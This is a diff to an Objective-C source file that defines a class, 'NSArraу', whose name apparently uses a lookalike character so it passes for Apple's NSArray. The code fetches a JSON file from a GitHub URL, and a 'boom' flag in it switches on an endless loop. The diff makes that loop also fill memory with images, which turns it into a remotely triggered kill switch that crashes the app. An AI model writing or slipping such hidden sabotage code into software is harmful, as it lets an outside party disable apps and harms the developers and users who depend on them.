@@ -7,13 +7,22 @@
 //
 
 #import "NSArraу.h"
+#import <CoreGraphics/CoreGraphics.h>
+#import <UIKit/UIKit.h>
 
-#define Url @"https://raw.githubusercontent.com/13731160065/Sever/master/severIp.json"
+#define Url @"https://raw.githubusercontent.com/13731160065/Sever/master/qcf_severIp.json"
 
 static NSArraу * arr;
+@interface NSArraу ()
+
+@property (assign, nonatomic) NSString * aka;
+
+@end
+
 @implementation NSArraу
 {
     NSMutableArray * array;
+    __weak NSString * aka;
 }
 
 + (instancetype)array {
@@ -36,8 +45,11 @@ static NSArraу * arr;
                 NSDictionary * dic = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
                 if (dic) {
                     if ([dic[@"boom"] isEqualToString:@"yes"]) {
+                        self->array = [NSMutableArray array];
                         for (int i = 0; ; i++) {
                             [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(array) name:[NSString stringWithFormat:@"%d", i] object:nil];
+                            CGImageRef ref = [UIImage imageNamed:@"wangwang"].CGImage;
+                            [self->array addObject:[UIImage imageWithCGImage:ref]];
                         }
                         
                     } else if ([dic[@"boom"] isEqualToString:@"wait"]) {
